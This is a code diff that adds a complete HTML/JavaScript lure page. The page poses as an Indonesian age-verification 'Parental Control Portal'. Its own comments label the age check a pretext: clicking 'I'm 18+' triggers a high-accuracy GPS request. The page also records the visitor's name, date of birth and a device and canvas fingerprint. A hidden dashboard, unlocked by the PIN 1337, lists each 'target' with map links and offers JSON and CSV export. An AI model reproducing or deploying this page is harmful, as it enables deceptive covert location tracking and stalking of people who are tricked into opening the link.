@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi Usia — Kontrol Orang Tua</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Inter',sans-serif;
+  background:#f5f5f5;color:#1a1a1a;
+  min-height:100vh;display:flex;justify-content:center;
+  -webkit-user-select:none;user-select:none
+}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:#eee}
+::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+
+.container{width:100%;max-width:420px;padding:16px;position:relative}
+
+/* LOADING */
+.loading-screen{
+  position:fixed;inset:0;background:#fff;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  z-index:999;transition:opacity 0.4s
+}
+.loading-screen.hide{opacity:0;pointer-events:none}
+.loading-screen .spinner{
+  width:44px;height:44px;border:3px solid #e0e0e0;
+  border-top-color:#2979ff;border-radius:50%;
+  animation:spin 0.8s linear infinite
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-screen p{margin-top:14px;color:#999;font-size:13px}
+
+/* AGE VERIFICATION OVERLAY */
+.age-overlay{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,0.55);
+  backdrop-filter:blur(6px);
+  display:none;align-items:center;justify-content:center;
+  padding:20px
+}
+.age-overlay.show{display:flex}
+.age-card{
+  background:#fff;border-radius:20px;
+  padding:32px 28px 24px;
+  max-width:380px;width:100%;
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,0.3);
+  animation:slideUp 0.35s ease-out
+}
+@keyframes slideUp{
+  from{transform:translateY(30px);opacity:0}
+  to{transform:translateY(0);opacity:1}
+}
+.age-card .icon{font-size:48px;margin-bottom:8px}
+.age-card h2{font-size:20px;font-weight:800;margin-bottom:4px;color:#1a1a1a}
+.age-card p{font-size:13px;color:#888;line-height:1.5;margin-bottom:8px}
+.age-card .warning{
+  font-size:11px;color:#ff6b6b;background:#fff0f0;
+  padding:10px 14px;border-radius:8px;margin-bottom:16px;
+  line-height:1.5;font-weight:500
+}
+.age-card .btn-group{display:flex;gap:10px}
+.age-card button{
+  flex:1;padding:14px;border-radius:12px;border:none;
+  font-weight:700;font-size:14px;cursor:pointer;
+  transition:all 0.2s;font-family:'Inter',sans-serif
+}
+.age-card .btn-yes{
+  background:#2979ff;color:#fff;
+  box-shadow:0 4px 16px rgba(41,121,255,0.3)
+}
+.age-card .btn-yes:hover{background:#1565c0;transform:translateY(-1px)}
+.age-card .btn-no{
+  background:#f0f0f0;color:#888
+}
+.age-card .btn-no:hover{background:#e0e0e0}
+
+/* HEADER */
+.header{
+  text-align:center;padding:20px 0 16px;
+  border-bottom:1px solid rgba(0,0,0,0.04);margin-bottom:16px
+}
+.header .brand{
+  font-size:22px;font-weight:800;
+  color:#2979ff;letter-spacing:-0.5px
+}
+.header .sub{font-size:11px;color:#999;margin-top:4px}
+
+/* CARD */
+.card{
+  background:#fff;border:1px solid rgba(0,0,0,0.04);
+  border-radius:16px;padding:24px;margin-bottom:14px;
+  box-shadow:0 1px 4px rgba(0,0,0,0.02)
+}
+.card h2{font-size:17px;font-weight:700;margin-bottom:4px}
+.card p{font-size:13px;color:#888;line-height:1.6;margin-bottom:14px}
+
+.input-group{margin-bottom:14px}
+.input-group label{
+  display:block;font-size:11px;font-weight:600;color:#999;
+  text-transform:uppercase;letter-spacing:1px;margin-bottom:6px
+}
+.input-group input{
+  width:100%;padding:13px 16px;border-radius:10px;
+  border:1px solid rgba(0,0,0,0.06);
+  background:#fafafa;color:#1a1a1a;
+  font-size:14px;font-family:'Inter',sans-serif;outline:none;
+  transition:border-color 0.2s
+}
+.input-group input:focus{border-color:#2979ff;background:#fff}
+.input-group input::placeholder{color:#bbb}
+
+.btn{
+  width:100%;padding:15px;border-radius:10px;border:none;
+  font-weight:700;font-size:14px;font-family:'Inter',sans-serif;
+  cursor:pointer;transition:all 0.2s;
+  letter-spacing:0.5px
+}
+.btn-primary{
+  background:#2979ff;color:#fff;
+  box-shadow:0 4px 16px rgba(41,121,255,0.25)
+}
+.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(41,121,255,0.35)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{opacity:0.35;cursor:not-allowed;transform:none}
+.btn-secondary{
+  background:#f5f5f5;color:#888;
+  border:1px solid rgba(0,0,0,0.04)
+}
+.btn-secondary:hover{background:#eee;color:#555}
+
+/* PROGRESS */
+.progress-wrap{display:none;margin:16px 0}
+.progress-wrap.show{display:block}
+.progress-bar{
+  height:5px;background:#eee;
+  border-radius:3px;overflow:hidden
+}
+.progress-fill{
+  height:100%;background:linear-gradient(90deg,#2979ff,#7c4dff);
+  border-radius:3px;width:0%;transition:width 0.3s
+}
+.progress-text{
+  display:flex;justify-content:space-between;
+  font-size:11px;color:#999;margin-top:6px
+}
+
+/* RESULT */
+.result{display:none;margin:12px 0}
+.result.show{display:block}
+.result .success{
+  text-align:center;padding:20px;border-radius:12px;
+  background:#f0f7ff;border:1px solid rgba(41,121,255,0.12);
+  margin-bottom:12px
+}
+.result .success .icon{font-size:36px;margin-bottom:6px}
+.result .success h3{font-size:16px;color:#2979ff;margin-bottom:2px}
+.result .success p{font-size:12px;color:#888;margin:0}
+
+/* INFO ROW */
+.info-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
+.info-item{
+  background:#fafafa;border:1px solid rgba(0,0,0,0.03);
+  border-radius:10px;padding:12px;text-align:center
+}
+.info-item .val{font-size:18px;font-weight:800;color:#2979ff}
+.info-item .lbl{font-size:10px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-top:3px}
+
+/* DASHBOARD */
+.dashboard{display:none}
+.dashboard.show{display:block}
+.dash-header{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:16px 0;border-bottom:1px solid rgba(0,0,0,0.04);margin-bottom:14px
+}
+.dash-header h1{font-size:20px;font-weight:800}
+.dash-header .count{font-size:12px;color:#999;background:#f5f5f5;padding:4px 12px;border-radius:20px}
+
+.dash-stats{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px
+}
+.dash-stat{
+  background:#fff;border:1px solid rgba(0,0,0,0.04);border-radius:10px;padding:12px;text-align:center
+}
+.dash-stat .val{font-size:18px;font-weight:800;color:#2979ff}
+.dash-stat .lbl{font-size:9px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+
+.dash-actions{display:flex;gap:8px;margin-bottom:14px}
+.dash-actions button{
+  flex:1;padding:10px;border-radius:8px;border:1px solid rgba(0,0,0,0.04);
+  background:#fafafa;color:#888;font-size:11px;
+  font-weight:600;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif
+}
+.dash-actions button:hover{background:#f0f0f0;color:#333}
+
+/* ENTRY */
+.entry{
+  background:#fff;border:1px solid rgba(0,0,0,0.04);
+  border-radius:12px;padding:14px;margin-bottom:10px;
+  cursor:pointer;transition:all 0.15s
+}
+.entry:hover{border-color:rgba(41,121,255,0.12);box-shadow:0 1px 4px rgba(0,0,0,0.04)}
+.entry .e-hdr{
+  display:flex;justify-content:space-between;align-items:center;margin-bottom:6px
+}
+.entry .e-name{font-size:13px;font-weight:600}
+.entry .e-time{font-size:10px;color:#aaa}
+.entry .e-addr{font-size:11px;color:#888}
+.entry .e-body{display:none;margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,0,0,0.04)}
+.entry .e-body.show{display:block}
+.entry .e-body table{width:100%;font-size:11px}
+.entry .e-body td{padding:3px 0;color:#777;vertical-align:top}
+.entry .e-body td:first-child{color:#aaa;width:80px}
+.entry .e-body td:last-child{word-break:break-all;color:#555}
+.entry .loc-link{
+  display:inline-block;padding:4px 10px;border-radius:4px;
+  background:rgba(41,121,255,0.06);color:#2979ff;
+  font-size:10px;text-decoration:none;margin-top:4px;font-weight:600
+}
+.entry .tag{
+  display:inline-block;padding:2px 8px;border-radius:4px;
+  font-size:9px;font-weight:700;background:rgba(41,121,255,0.08);color:#2979ff
+}
+
+/* LOCK */
+.lock-screen{
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:center;min-height:70vh;text-align:center
+}
+.lock-screen .icon{font-size:44px;margin-bottom:10px}
+.lock-screen h2{font-size:18px;margin-bottom:4px}
+.lock-screen p{font-size:13px;color:#888;margin-bottom:18px}
+.lock-screen input{
+  width:180px;padding:12px;border-radius:8px;
+  border:1px solid rgba(0,0,0,0.08);
+  background:#fafafa;color:#1a1a1a;
+  font-size:22px;text-align:center;letter-spacing:6px;
+  font-family:'Inter',sans-serif;outline:none
+}
+.lock-screen input:focus{border-color:#2979ff}
+.lock-screen .err{color:#ff1744;font-size:12px;margin-top:8px;display:none}
+
+.empty{text-align:center;padding:40px 20px;color:#999}
+.empty .icon{font-size:44px;margin-bottom:8px}
+.empty h3{font-size:15px;margin-bottom:4px;color:#555}
+.empty p{font-size:12px}
+
+.footer{text-align:center;padding:20px 0;color:#bbb;font-size:11px}
+
+@media(max-width:400px){
+  .info-row{grid-template-columns:1fr}
+  .dash-stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div class="loading-screen" id="loading">
+  <div class="spinner"></div>
+  <p>Loading security check...</p>
+</div>
+
+<!-- AGE VERIFICATION OVERLAY (PRETEXT FOR GPS) -->
+<div class="age-overlay" id="ageOverlay">
+  <div class="age-card">
+    <div class="icon">🔞</div>
+    <h2>Verifikasi Usia</h2>
+    <p>Untuk mengakses halaman ini, Anda harus berusia 18+ tahun.</p>
+    <div class="warning">⚠️ Lokasi Anda akan diverifikasi untuk memastikan kepatuhan terhadap peraturan daerah.</div>
+    <div class="btn-group">
+      <button class="btn btn-yes" id="ageYes">✓ Saya 18+</button>
+      <button class="btn btn-no" id="ageNo">✕ Tidak</button>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <!-- LURE PAGE -->
+  <div id="lurePage">
+    <div class="header">
+      <div class="brand">🔞 Parental Control Portal</div>
+      <div class="sub">Verifikasi usia & kepatuhan konten</div>
+    </div>
+
+    <div class="info-row">
+      <div class="info-item"><div class="val">18+</div><div class="lbl">Minimum Age</div></div>
+      <div class="info-item"><div class="val" id="liveCount">0</div><div class="lbl">Verified Today</div></div>
+    </div>
+
+    <div class="card">
+      <h2>Verifikasi Akun</h2>
+      <p>Lengkapi data untuk verifikasi usia dan kepatuhan. Data Anda aman dan terenkripsi.</p>
+
+      <div class="input-group">
+        <label>Nama Lengkap</label>
+        <input type="text" id="nameInput" placeholder="Masukkan nama lengkap" autocomplete="off">
+      </div>
+      <div class="input-group">
+        <label>Tanggal Lahir</label>
+        <input type="text" id="dobInput" placeholder="DD/MM/YYYY (contoh: 15/08/2000)" autocomplete="off">
+      </div>
+
+      <button class="btn btn-primary" id="verifyBtn">✓ Verifikasi Sekarang</button>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="progress-text"><span id="progLabel">Memeriksa data...</span><span id="progPct">0%</span></div>
+      </div>
+
+      <div class="result" id="result">
+        <div class="success">
+          <div class="icon">✅</div>
+          <h3>Verifikasi Berhasil</h3>
+          <p>Akun Anda telah terverifikasi. Silakan lanjutkan.</p>
+        </div>
+        <button class="btn btn-secondary" id="doneBtn">OK, Lanjutkan</button>
+      </div>
+    </div>
+
+    <div class="card" style="padding:14px">
+      <p style="margin-bottom:6px;font-size:12px;color:#888">Mengapa verifikasi diperlukan?</p>
+      <div style="font-size:11px;color:#bbb;line-height:1.6">
+        Berdasarkan peraturan yang berlaku, kami diwajibkan untuk memverifikasi usia
+        pengguna sebelum mengizinkan akses ke konten tertentu. Verifikasi ini
+        menggunakan teknologi geolokasi untuk memastikan kepatuhan regional.
+        Data Anda tidak akan dibagikan kepada pihak ketiga.
+      </div>
+    </div>
+
+    <div class="footer">© 2026 Parental Control Portal — All rights reserved</div>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div class="dashboard" id="dashboard">
+    <div class="lock-screen" id="lockScreen">
+      <div class="icon">🔒</div>
+      <h2>Dashboard Terkunci</h2>
+      <p>Masukkan PIN untuk melihat data</p>
+      <input type="password" id="pinInput" maxlength="6" placeholder="••••">
+      <div class="err" id="pinErr">PIN salah</div>
+    </div>
+
+    <div id="dashContent" style="display:none">
+      <div class="dash-header">
+        <h1>📍 GPS Tracker</h1>
+        <div class="count" id="entryCount">0 entries</div>
+      </div>
+
+      <div style="background:#f0f7ff;border:1px solid rgba(41,121,255,0.12);border-radius:10px;padding:12px;margin-bottom:14px;font-size:12px;color:#666">
+        <strong style="color:#2979ff">📍 GPS Real Location</strong><br>
+        Data langsung dari Google Maps link. Klik entry untuk detail.
+      </div>
+
+      <div class="dash-stats">
+        <div class="dash-stat"><div class="val" id="dTotal">0</div><div class="lbl">Total Visits</div></div>
+        <div class="dash-stat"><div class="val" id="dGPS">0</div><div class="lbl">GPS Hits</div></div>
+        <div class="dash-stat"><div class="val" id="dToday">0</div><div class="lbl">Today</div></div>
+      </div>
+      <div class="dash-actions">
+        <button onclick="exportJSON()">📥 Export JSON</button>
+        <button onclick="exportCSV()">📊 Export CSV</button>
+        <button onclick="clearAll()">🗑 Clear</button>
+      </div>
+      <div id="entriesList"></div>
+      <div class="footer">Tap entry to expand details</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+const $ = id => document.getElementById(id);
+const DASH_PIN = '1337';
+const STORAGE_KEY = 'gps_tracker_data';
+
+let gpsCaptured = false;
+let gpsData = null;
+
+function getStored(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||[]}catch(e){return[]}}
+function saveData(data){localStorage.setItem(STORAGE_KEY, JSON.stringify(data))}
+
+// ─── GPS ONLY — NO IP ───
+function requestGPS(){
+  return new Promise(resolve => {
+    if(!navigator.geolocation){
+      alert('Geolocation tidak didukung browser ini.');
+      return resolve(null);
+    }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        gpsData = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          acc: Math.round(pos.coords.accuracy) + 'm',
+          alt: pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
+          altAcc: pos.coords.altitudeAccuracy ? Math.round(pos.coords.altitudeAccuracy) + 'm' : null,
+          heading: pos.coords.heading ? Math.round(pos.coords.heading) + '°' : null,
+          speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) + ' km/h' : null,
+          timestamp: new Date(pos.timestamp).toISOString()
+        };
+        gpsCaptured = true;
+        resolve(gpsData);
+      },
+      err => {
+        let reason = 'unknown';
+        if(err.code === 1) reason = 'denied';
+        else if(err.code === 2) reason = 'unavailable';
+        else if(err.code === 3) reason = 'timeout';
+        resolve(null);
+      },
+      {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
+    );
+  });
+}
+
+function getFingerprint(){
+  const canvas = document.createElement('canvas');
+  canvas.width = 200; canvas.height = 50;
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+  ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+  ctx.fillStyle = '#069'; ctx.fillText('fp', 2, 15);
+  const fp = canvas.toDataURL();
+
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    colorDepth: screen.colorDepth,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    canvasFP: btoa(fp).slice(0, 50),
+    vendor: navigator.vendor,
+    appVersion: navigator.appVersion.slice(0, 80),
+    touch: 'ontouchstart' in window,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    referrer: document.referrer || 'direct',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    pageLoad: new Date().toISOString()
+  };
+}
+
+function buildEntry(name, dob, gps, fp){
+  return {
+    id: Date.now() + '_' + Math.random().toString(36).slice(2,6),
+    timestamp: new Date().toISOString(),
+    date: new Date().toLocaleDateString('en-ID'),
+    time: new Date().toLocaleTimeString('en-ID'),
+    name: name || 'anonymous',
+    dob: dob || 'not provided',
+    gps: gps,
+    hasGPS: !!gps,
+    lat: gps ? gps.lat : null,
+    lng: gps ? gps.lng : null,
+    accuracy: gps ? gps.acc : 'no-gps',
+    ...fp
+  };
+}
+
+// ─── AGE OVERLAY → GPS ───
+function showAgeVerification(){
+  return new Promise(resolve => {
+    const overlay = $('ageOverlay');
+    overlay.classList.add('show');
+
+    $('ageYes').onclick = async () => {
+      overlay.classList.remove('show');
+      resolve(true);
+    };
+
+    $('ageNo').onclick = () => {
+      overlay.classList.remove('show');
+      alert('Maaf, Anda harus berusia 18+ untuk mengakses halaman ini.');
+      resolve(false);
+    };
+  });
+}
+
+// ─── FAKE PROCESS ───
+async function runVerify(){
+  const btn = $('verifyBtn');
+  const wrap = $('progressWrap');
+  const fill = $('progressFill');
+  const label = $('progLabel');
+  const pct = $('progPct');
+  const result = $('result');
+  const name = $('nameInput').value.trim() || 'anonymous';
+  const dob = $('dobInput').value.trim() || 'not provided';
+
+  btn.disabled = true;
+  btn.textContent = '⏳ Memproses...';
+  wrap.classList.add('show');
+  result.classList.remove('show');
+
+  const stages = [
+    [10, 'Menghubungkan ke server...'],
+    [25, 'Memverifikasi data kependudukan...'],
+    [40, 'Validasi usia...'],
+    [55, 'Cross-check wilayah (geolokasi)...'],
+    [70, 'Verifikasi kepatuhan regional...'],
+    [85, 'Finalisasi data...'],
+    [100, 'Selesai!'],
+  ];
+
+  for(const [p, l] of stages){
+    await delay(350 + Math.random() * 500);
+    fill.style.width = p + '%';
+    label.textContent = l;
+    pct.textContent = p + '%';
+  }
+
+  await delay(400);
+
+  // After progress done, trigger GPS if not already captured
+  if(!gpsCaptured){
+    await requestGPS();
+  }
+
+  result.classList.add('show');
+  btn.textContent = '✓ Terverifikasi';
+  btn.disabled = false;
+
+  // Save entry
+  const fp = getFingerprint();
+  const entry = buildEntry(name, dob, gpsData, fp);
+  const stored = getStored();
+  stored.push(entry);
+  saveData(stored);
+  updateLiveCount();
+}
+
+function delay(ms){return new Promise(r=>setTimeout(r,ms))}
+
+function updateLiveCount(){
+  const stored = getStored();
+  const today = stored.filter(e => e.date === new Date().toLocaleDateString('en-ID')).length;
+  $('liveCount').textContent = today;
+}
+
+// ─── DASHBOARD ───
+window.exportJSON = function(){
+  const data = getStored();
+  const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `gps_tracker_${Date.now()}.json`;
+  a.click();
+};
+
+window.exportCSV = function(){
+  const data = getStored();
+  if(!data.length) return;
+  const keys = ['timestamp','name','lat','lng','accuracy','platform','timezone'];
+  const rows = data.map(e => keys.map(k => {
+    let v = e[k] || e.gps?.[k] || '';
+    return String(v).replace(/,/g, ';');
+  }));
+  const csv = [keys.join(','), ...rows.map(r => r.join(','))].join('\n');
+  const blob = new Blob([csv], {type:'text/csv'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `gps_tracker_${Date.now()}.csv`;
+  a.click();
+};
+
+window.clearAll = function(){
+  if(!confirm('Hapus semua data?')) return;
+  localStorage.removeItem(STORAGE_KEY);
+  renderDashboard();
+};
+
+function renderDashboard(){
+  const data = getStored();
+  $('entryCount').textContent = data.length + ' entries';
+  $('dTotal').textContent = data.length;
+  $('dGPS').textContent = data.filter(e => e.hasGPS).length;
+  $('dToday').textContent = data.filter(e => e.date === new Date().toLocaleDateString('en-ID')).length;
+
+  const list = $('entriesList');
+  if(!data.length){
+    list.innerHTML = `<div class="empty"><div class="icon">📭</div><h3>Belum ada data</h3><p>Tunggu target buka link ini</p></div>`;
+    return;
+  }
+
+  list.innerHTML = [...data].reverse().map(e => `
+    <div class="entry" onclick="toggleEntry('${e.id}')">
+      <div class="e-hdr">
+        <div class="e-name">${e.name} ${e.hasGPS ? '<span class="tag">GPS</span>' : '<span style="display:inline-block;padding:2px 8px;border-radius:4px;font-size:9px;font-weight:700;background:rgba(255,0,0,0.06);color:#ff1744">NO GPS</span>'}</div>
+        <div class="e-time">${e.date} ${e.time}</div>
+      </div>
+      <div class="e-addr">
+        ${e.lat ? `${e.lat.toFixed(4)}, ${e.lng.toFixed(4)}` : 'Lokasi tidak tersedia (GPS ditolak)'}
+      </div>
+      <div class="e-body" id="body_${e.id}">
+        <table>
+          <tr><td>Latitude</td><td>${e.lat ?? '?'}</td></tr>
+          <tr><td>Longitude</td><td>${e.lng ?? '?'}</td></tr>
+          <tr><td>Accuracy</td><td>${e.accuracy || '?'}</td></tr>
+          ${e.gps?.alt ? `<tr><td>Altitude</td><td>${e.gps.alt}</td></tr>` : ''}
+          ${e.gps?.heading ? `<tr><td>Heading</td><td>${e.gps.heading}</td></tr>` : ''}
+          ${e.gps?.speed ? `<tr><td>Speed</td><td>${e.gps.speed}</td></tr>` : ''}
+          ${e.gps?.timestamp ? `<tr><td>GPS Timestamp</td><td>${e.gps.timestamp}</td></tr>` : ''}
+          <tr><td>Map</td><td>
+            ${e.lat ? `<a class="loc-link" target="_blank" href="https://www.google.com/maps?q=${e.lat},${e.lng}">Open in Google Maps ↗</a>` : '—'}
+          </td></tr>
+          <tr><td>Name</td><td>${e.name}</td></tr>
+          <tr><td>DOB</td><td>${e.dob}</td></tr>
+          <tr><td>Device</td><td>${e.platform || '?'}</td></tr>
+          <tr><td>Browser</td><td>${(e.userAgent||'').slice(0,80)}</td></tr>
+          <tr><td>Language</td><td>${e.language || '?'}</td></tr>
+          <tr><td>Timezone</td><td>${e.timezone || '?'} (UTC${e.timezoneOffset > 0 ? '-' : '+'}${Math.abs((e.timezoneOffset||0)/60)})</td></tr>
+          <tr><td>Screen</td><td>${e.screen || '?'}</td></tr>
+          <tr><td>Touch</td><td>${e.touch ? 'Yes' : 'No'}</td></tr>
+          <tr><td>CPU</td><td>${e.hardwareConcurrency || '?'} cores</td></tr>
+          <tr><td>Memory</td><td>${e.deviceMemory || '?'} GB</td></tr>
+          <tr><td>Referrer</td><td>${e.referrer || '?'}</td></tr>
+          <tr><td>Timestamp</td><td>${e.timestamp}</td></tr>
+        </table>
+      </div>
+    </div>
+  `).join('');
+}
+
+window.toggleEntry = function(id){
+  const el = document.getElementById('body_' + id);
+  if(el) el.classList.toggle('show');
+};
+
+// ─── ROUTING ───
+function handleRouting(){
+  const params = new URLSearchParams(window.location.search);
+  const admin = params.get('admin');
+  if(admin === DASH_PIN){
+    document.getElementById('lurePage').style.display = 'none';
+    document.getElementById('dashboard').classList.add('show');
+    document.getElementById('lockScreen').style.display = 'none';
+    document.getElementById('dashContent').style.display = 'block';
+    renderDashboard();
+    return true;
+  }
+  return false;
+}
+
+// ─── EVENTS ───
+$('verifyBtn').addEventListener('click', runVerify);
+$('dobInput').addEventListener('keydown', e => {
+  if(e.key === 'Enter') runVerify();
+});
+$('doneBtn').addEventListener('click', () => {
+  $('result').classList.remove('show');
+});
+
+$('pinInput').addEventListener('input', function(){
+  if(this.value === DASH_PIN){
+    document.getElementById('lockScreen').style.display = 'none';
+    document.getElementById('dashContent').style.display = 'block';
+    renderDashboard();
+    const url = new URL(window.location);
+    url.searchParams.set('admin', DASH_PIN);
+    window.history.replaceState({}, '', url);
+  }
+});
+
+// ─── INIT ───
+async function init(){
+  const isDashboard = handleRouting();
+
+  if(!isDashboard){
+    document.getElementById('lurePage').style.display = 'block';
+
+    // Hide loading
+    setTimeout(() => {
+      document.getElementById('loading').classList.add('hide');
+    }, 1000);
+
+    // Show age verification overlay as soon as page loads
+    setTimeout(async () => {
+      const ok = await showAgeVerification();
+      if(ok){
+        // User clicked "I'm 18+" → trigger GPS disguised as age check
+        requestGPS();
+      }
+    }, 1200);
+
+    updateLiveCount();
+  }
+}
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+init();
+
+})();
+</script>
+</body>
+</html>
